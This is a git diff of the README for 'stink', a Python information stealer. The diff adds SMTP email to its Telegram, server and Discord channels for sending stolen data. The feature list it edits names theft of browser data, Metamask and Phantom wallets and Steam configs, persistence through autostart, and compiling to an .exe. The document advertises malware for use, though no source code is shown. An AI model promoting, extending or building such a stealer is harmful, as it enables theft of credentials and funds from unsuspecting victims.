@@ -1,6 +1,6 @@
 # stink
 
-Stealer in just a few lines with sending to Telegram / Server / Discord. No dependencies, only built-in libraries.
+Stealer in just a few lines with sending to Telegram / Server / Discord / SMTP. No dependencies, only built-in libraries.
 
 **Wiki:** https://github.com/FallenAstaroth/stink/wiki
 
@@ -44,8 +44,12 @@ The `stink` already has an impressive functionality that will only expand.
        - Metamask
        - Phantom
    - Steam configs
-3. Support for browser multiprofiles.
-4. Sending an archive of collected data to Telegram / Server / Discord.
+3. Built-in sending methods: 
+   - Telegram
+   - Server
+   - Discord
+   - SMTP
+4. Support for browser multiprofiles.
 5. Execution in a separate thread.
 6. Execution using multiprocessor.
 7. Possibility to add to autostart.
@@ -123,6 +127,8 @@ if __name__ == '__main__':
   - `telegram` - sending to Telegram.
 
   - `discord` - sending to Discord.
+
+  - `smtp` - send to mail.
   
 ## Creating exe
 Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
